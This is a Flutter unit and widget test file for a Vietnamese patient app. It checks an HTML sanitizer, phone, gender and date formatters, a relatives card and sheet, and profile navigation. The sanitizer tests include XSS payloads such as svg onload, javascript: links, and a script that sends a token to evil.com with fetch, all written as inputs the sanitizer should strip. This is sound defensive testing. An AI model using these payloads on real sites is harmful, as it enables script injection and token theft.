import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:mocktail/mocktail.dart';

import 'package:adsus_mobile/core/utils/html_sanitizer.dart';
import 'package:adsus_mobile/features/auth/domain/entities/auth_session.dart';
import 'package:adsus_mobile/features/auth/domain/entities/user_profile.dart';
import 'package:adsus_mobile/features/auth/domain/repositories/auth_repository.dart';
import 'package:adsus_mobile/features/auth/presentation/viewmodels/auth_view_model.dart';
import 'package:adsus_mobile/features/auth/presentation/views/profile_screen.dart';
import 'package:adsus_mobile/features/patient_relationship/domain/entities/patient_relationship.dart';
import 'package:adsus_mobile/features/patient_relationship/domain/repositories/patient_relationship_repository.dart';
import 'package:adsus_mobile/features/patient_relationship/presentation/views/my_relatives_screen.dart';
import 'package:adsus_mobile/features/patient_relationship/presentation/views/widgets/relative_card.dart';
import 'package:adsus_mobile/shared/providers/app_providers.dart';

class _MockAuthRepository extends Mock implements AuthRepository {}
class _MockPatientRelationshipRepository extends Mock
    implements PatientRelationshipRepository {}
class _FakeAuthViewModel extends StateNotifier<AuthState>
    implements AuthViewModel {
  _FakeAuthViewModel() : super(const AuthState());
  @override
  dynamic noSuchMethod(Invocation invocation) => super.noSuchMethod(invocation);
}

void main() {
  group('CHALLENGER: HtmlSanitizer Stress & Boundary Suite', () {
    test('STRESS-HTML-01: Complex nested, mixed-case, and self-closing tags', () {
      const complexHtml = '<DIV class="wrapper"><sPan><p><B><I>Nguyễn Trí Dũng</I></B></p></sPan></DIV>';
      expect(HtmlSanitizer.sanitize(complexHtml), 'Nguyễn Trí Dũng');

      const imgTag = '<img src="https://example.com/avatar.png" alt="Avatar"/>';
      expect(HtmlSanitizer.sanitize(imgTag), '');

      const voidTags = 'Line 1<br/>Line 2<hr>Line 3<br>';
      expect(HtmlSanitizer.sanitize(voidTags), 'Line 1Line 2Line 3');
    });

    test('STRESS-HTML-02: Advanced XSS vectors, event handlers, and payloads', () {
      // SVG vector
      expect(HtmlSanitizer.sanitize('<svg/onload=alert(1)>Bác Ba'), 'Bác Ba');
      // Body tag with onload
      expect(HtmlSanitizer.sanitize('<body onload="alert(1)">Chú Năm</body>'), 'Chú Năm');
      // Obfuscated / uppercase script blocks
      expect(
        HtmlSanitizer.sanitize('<SCRIPT SRC="evil.js"></SCRIPT><script >\nwindow.location="http://evil.com";\n</script>Ông Nội'),
        'Ông Nội',
      );
      // Iframe and style injection
      expect(
        HtmlSanitizer.sanitize('<IFRAME SRC="javascript:alert(1)"></IFRAME><STYLE>* {display:none;}</STYLE>Bà Ngoại'),
        'Bà Ngoại',
      );
      // Event handler inside anchor tag
      expect(
        HtmlSanitizer.sanitize('<a href="javascript:alert(1)" onclick="stealCookies()">Liên hệ</a>'),
        'Liên hệ',
      );
    });

    test('STRESS-HTML-03: Entity decoding and anti-double-decode attack', () {
      expect(HtmlSanitizer.sanitize('&amp;'), '&');
      expect(HtmlSanitizer.sanitize('&lt;div&gt;'), '<div>');
      expect(HtmlSanitizer.sanitize('&quot;quoted&quot;'), '"quoted"');
      expect(HtmlSanitizer.sanitize('&#39;single&#39;'), "'single'");
      expect(HtmlSanitizer.sanitize('&apos;another&#39;'), "'another'");
      expect(HtmlSanitizer.sanitize('Word1&nbsp;&nbsp;Word2'), 'Word1 Word2');

      // Double decode prevention: &amp;lt; should decode to &lt; NOT <
      expect(HtmlSanitizer.sanitize('&amp;lt;script&gt;'), '&lt;script>');
    });

    test('STRESS-HTML-04: Extreme edge cases (null, whitespace, unicode, ReDoS)', () {
      expect(HtmlSanitizer.sanitize(null), '');
      expect(HtmlSanitizer.sanitize(''), '');
      expect(HtmlSanitizer.sanitize('   \n\r\t   '), '');

      // Unicode with Vietnamese diacritics & Emojis
      const unicodeSample = '  🩺 Bác sĩ: Nguyễn Đắc Khải Hưng 👨‍⚕️ 🌟  ';
      expect(HtmlSanitizer.sanitize(unicodeSample), '🩺 Bác sĩ: Nguyễn Đắc Khải Hưng 👨‍⚕️ 🌟');

      // Multilingual: Japanese, Chinese, Arabic (RTL)
      const multiLang = '<b>山田太郎</b> <i>李小龙</i> <span>مرحبا</span>';
      expect(HtmlSanitizer.sanitize(multiLang), '山田太郎 李小龙 مرحبا');

      // Long input (10,000 characters with nested tags) - ReDoS resistance
      final bigBuffer = StringBuffer();
      for (var i = 0; i < 500; i++) {
        bigBuffer.write('<div><span>Item $i </span></div>');
      }
      final sanitizedBig = HtmlSanitizer.sanitize(bigBuffer.toString());
      expect(sanitizedBig.startsWith('Item 0'), isTrue);
      expect(sanitizedBig.endsWith('Item 499'), isTrue);
      expect(sanitizedBig.contains('<'), isFalse);
    });

    test('STRESS-HTML-05: Phone formatting boundary testing', () {
      expect(HtmlSanitizer.formatPhone('0912345678'), '0912 345 678');
      expect(HtmlSanitizer.formatPhone('0398765432'), '0398 765 432');
      expect(HtmlSanitizer.formatPhone(null), 'Chưa cập nhật');
      expect(HtmlSanitizer.formatPhone(''), 'Chưa cập nhật');
      expect(HtmlSanitizer.formatPhone('   '), 'Chưa cập nhật');

      // 10 digits with HTML injection
      expect(HtmlSanitizer.formatPhone('<b>0912345678</b>'), '0912 345 678');
      expect(HtmlSanitizer.formatPhone('<script>alert(1)</script>0912345678'), '0912 345 678');

      // Non-10-digit numbers
      expect(HtmlSanitizer.formatPhone('09123'), '09123');
      expect(HtmlSanitizer.formatPhone('+84912345678'), '+84912345678');
      expect(HtmlSanitizer.formatPhone('1900 1234'), '1900 1234');
    });

    test('STRESS-HTML-06: Gender & Date formatting boundary testing', () {
      expect(HtmlSanitizer.formatGender('Nam'), 'Nam');
      expect(HtmlSanitizer.formatGender('<i>Nữ</i>'), 'Nữ');
      expect(HtmlSanitizer.formatGender(null), 'Chưa cập nhật');
      expect(HtmlSanitizer.formatGender('   '), 'Chưa cập nhật');

      // Date padding
      expect(HtmlSanitizer.formatDate(DateTime(2026, 1, 5)), '05/01/2026');
      expect(HtmlSanitizer.formatDate(DateTime(2024, 2, 29)), '29/02/2024'); // Leap year
      expect(HtmlSanitizer.formatDate(null), 'Chưa cập nhật');
    });

    test('STRESS-HTML-07: Strips multiline script blocks, HTML comments, and recursively nested tags', () {
      const multilineScript = '''
        <script type="text/javascript">
          var token = "secret";
          fetch("http://evil.com/leak?t=" + token);
        </script>
        Bác sĩ Chuyên Khoa
      ''';
      expect(HtmlSanitizer.sanitize(multilineScript), 'Bác sĩ Chuyên Khoa');

      const commentAndScript = '<!-- comment -->Nguyen Van B<!-- another comment --><script>alert(1)</script>';
      expect(HtmlSanitizer.sanitize(commentAndScript), 'Nguyen Van B');

      // Nested script payload is cleanly removed, leaving no executable payload
      const nestedScriptAttempt = '<scr<script>ipt>alert(1)</script>Le Thi C';
      final result = HtmlSanitizer.sanitize(nestedScriptAttempt);
      expect(result.contains('alert'), isFalse);
      expect(result.contains('script'), isFalse);
      expect(result.contains('Le Thi C'), isTrue);
    });
  });

  group('CHALLENGER: RelativeCard & RelativeDetailSheet Adversarial Widget Tests', () {
    Widget buildCard({
      required PatientRelationship relative,
      bool isDeleting = false,
      VoidCallback? onDelete,
    }) {
      return MaterialApp(
        home: Scaffold(
          body: Center(
            child: RelativeCard(
              relative: relative,
              isDeleting: isDeleting,
              onDelete: onDelete ?? () {},
            ),
          ),
        ),
      );
    }

    testWidgets('STRESS-WIDGET-01: Extremely long text fields do not cause layout crashes', (tester) async {
      tester.view.physicalSize = const Size(1080, 2400);
      tester.view.devicePixelRatio = 1.0;
      addTearDown(() {
        tester.view.resetPhysicalSize();
        tester.view.resetDevicePixelRatio();
      });

      final longRelative = PatientRelationship(
        relationshipId: 'rel-long',
        patientProfileId: 'p-01',
        fullName: 'Nguyễn ' * 20, // 140+ chars
        relationshipName: 'Họ hàng xa ba đời bên ngoại ' * 5,
        phone: '0912345678',
        dateOfBirth: DateTime(1990, 1, 1),
        createdAt: DateTime(2026, 1, 1),
      );

      await tester.pumpWidget(buildCard(relative: longRelative));
      await tester.pumpAndSettle();

      // Ensure card renders
      expect(find.byType(RelativeCard), findsOneWidget);

      // Tap to open sheet
      await tester.tap(find.byType(RelativeCard));
      await tester.pumpAndSettle();

      // Ensure sheet renders without throwing FlutterError or RenderFlex overflow crash
      expect(find.byType(RelativeDetailSheet), findsOneWidget);
      expect(tester.takeException(), isNull);
    });

    testWidgets('STRESS-WIDGET-02: All nullable/empty fields render safe fallbacks', (tester) async {
      tester.view.physicalSize = const Size(1080, 2400);
      tester.view.devicePixelRatio = 1.0;
      addTearDown(() {
        tester.view.resetPhysicalSize();
        tester.view.resetDevicePixelRatio();
      });

      final emptyRelative = PatientRelationship(
        relationshipId: 'rel-null',
        patientProfileId: 'p-01',
        fullName: '',
        relationshipName: null,
        phone: null,
        dateOfBirth: null,
        createdAt: DateTime(2026, 1, 1),
      );

      await tester.pumpWidget(buildCard(relative: emptyRelative));
      await tester.pumpAndSettle();

      // Avatar initial from fallback 'Chưa có thông tin' is 'C'
      expect(find.text('C'), findsOneWidget);
      expect(find.text('Chưa có thông tin'), findsOneWidget);

      // Open sheet
      await tester.tap(find.byType(RelativeCard));
      await tester.pumpAndSettle();

      expect(find.byType(RelativeDetailSheet), findsOneWidget);
      expect(find.text('Chưa đặt nhãn'), findsOneWidget);
      expect(find.text('Chưa cập nhật'), findsNWidgets(3)); // phone, dob, age
      expect(find.text('01/01/2026'), findsOneWidget); // createdAt
      expect(tester.takeException(), isNull);
    });

    testWidgets('STRESS-WIDGET-03: Modal bottom sheet dismiss via backdrop and buttons', (tester) async {
      tester.view.physicalSize = const Size(1080, 2400);
      tester.view.devicePixelRatio = 1.0;
      addTearDown(() {
        tester.view.resetPhysicalSize();
        tester.view.resetDevicePixelRatio();
      });

      final sample = PatientRelationship(
        relationshipId: 'rel-sample',
        patientProfileId: 'p-01',
        fullName: 'Lê Hoàng Nam',
        relationshipName: 'Anh trai',
        phone: '0981112233',
        dateOfBirth: DateTime(1992, 10, 20),
        createdAt: DateTime(2026, 2, 1),
      );

      await tester.pumpWidget(buildCard(relative: sample));
      await tester.pumpAndSettle();

      // Open sheet
      await tester.tap(find.byType(RelativeCard));
      await tester.pumpAndSettle();
      expect(find.byType(RelativeDetailSheet), findsOneWidget);

      // Close via ĐÓNG button
      await tester.tap(find.text('ĐÓNG'));
      await tester.pumpAndSettle();
      expect(find.byType(RelativeDetailSheet), findsNothing);

      // Reopen sheet
      await tester.tap(find.byType(RelativeCard));
      await tester.pumpAndSettle();
      expect(find.byType(RelativeDetailSheet), findsOneWidget);

      // Close via X button
      await tester.tap(find.byTooltip('Đóng'));
      await tester.pumpAndSettle();
      expect(find.byType(RelativeDetailSheet), findsNothing);
    });

    testWidgets('STRESS-WIDGET-04: RelativeCard does not display delete button (delete disallowed)', (tester) async {
      var deleteTriggered = false;
      final sample = PatientRelationship(
        relationshipId: 'rel-del',
        patientProfileId: 'p-01',
        fullName: 'Trần Văn C',
        relationshipName: 'Em họ',
        phone: '0909090909',
        dateOfBirth: DateTime(2000, 1, 1),
        createdAt: DateTime(2026, 1, 1),
      );

      await tester.pumpWidget(buildCard(
        relative: sample,
        isDeleting: true,
        onDelete: () => deleteTriggered = true,
      ));
      await tester.pump();

      expect(find.byType(CircularProgressIndicator), findsNothing);
      expect(find.byIcon(Icons.delete_outline), findsNothing);
      expect(find.byTooltip('Xóa người thân'), findsNothing);
      expect(deleteTriggered, isFalse);
    });

    testWidgets('STRESS-WIDGET-05: Modal barrier shields card from double opening', (tester) async {
      tester.view.physicalSize = const Size(1080, 2400);
      tester.view.devicePixelRatio = 1.0;
      addTearDown(() {
        tester.view.resetPhysicalSize();
        tester.view.resetDevicePixelRatio();
      });

      final sample = PatientRelationship(
        relationshipId: 'rel-tap',
        patientProfileId: 'p-01',
        fullName: 'Đỗ Thị Lan',
        relationshipName: 'Chị dâu',
        phone: '0977665544',
        dateOfBirth: DateTime(1996, 7, 7),
        createdAt: DateTime(2026, 3, 1),
      );

      await tester.pumpWidget(buildCard(relative: sample));
      await tester.pumpAndSettle();

      // Tap card to open modal
      await tester.tap(find.byType(RelativeCard));
      await tester.pumpAndSettle();
      expect(find.byType(RelativeDetailSheet), findsOneWidget);

      // Tapping outside modal (barrier) closes modal cleanly
      await tester.tapAt(const Offset(50, 50));
      await tester.pumpAndSettle();
      expect(find.byType(RelativeDetailSheet), findsNothing);
      expect(tester.takeException(), isNull);
    });
  });

  group('CHALLENGER: ProfileScreen Navigation & Layout Verification', () {
    late _MockAuthRepository mockAuth;
    late _MockPatientRelationshipRepository mockRelRepo;

    const testProfile = UserProfile(
      fullName: 'Võ Văn Thưởng',
      phoneNumber: '0912345678',
      email: 'vovanthuong@example.com',
      role: UserRole.patient,
    );

    setUp(() {
      mockAuth = _MockAuthRepository();
      mockRelRepo = _MockPatientRelationshipRepository();
      when(() => mockAuth.getMyProfile()).thenAnswer((_) async => testProfile);
      when(() => mockRelRepo.getRelatives()).thenAnswer((_) async => []);
    });

    testWidgets('STRESS-NAV-01: ProfileScreen contains "Quản lý người thân" with correct icon and navigates', (tester) async {
      tester.view.physicalSize = const Size(1080, 2400);
      tester.view.devicePixelRatio = 1.0;
      addTearDown(() {
        tester.view.resetPhysicalSize();
        tester.view.resetDevicePixelRatio();
      });

      await tester.pumpWidget(
        ProviderScope(
          overrides: [
            authRepositoryProvider.overrideWithValue(mockAuth),
            patientRelationshipRepositoryProvider.overrideWithValue(mockRelRepo),
            authViewModelProvider.overrideWith((ref) => _FakeAuthViewModel()),
          ],
          child: const MaterialApp(
            home: ProfileScreen(),
          ),
        ),
      );
      await tester.pumpAndSettle();

      // Verify "Quản lý người thân" ListTile
      final relativesTileFinder = find.widgetWithText(ListTile, 'Quản lý người thân');
      expect(relativesTileFinder, findsOneWidget);

      final tile = tester.widget<ListTile>(relativesTileFinder);
      final icon = tile.leading as Icon?;
      expect(icon?.icon, Icons.people_outline);

      // Ensure visible & tap
      await tester.ensureVisible(relativesTileFinder);
      await tester.tap(relativesTileFinder);
      await tester.pumpAndSettle();

      // Verify MyRelativesScreen is pushed onto navigator stack
      expect(find.byType(MyRelativesScreen), findsOneWidget);
      expect(find.text('Danh bạ người thân'), findsOneWidget);
    });
  });
}
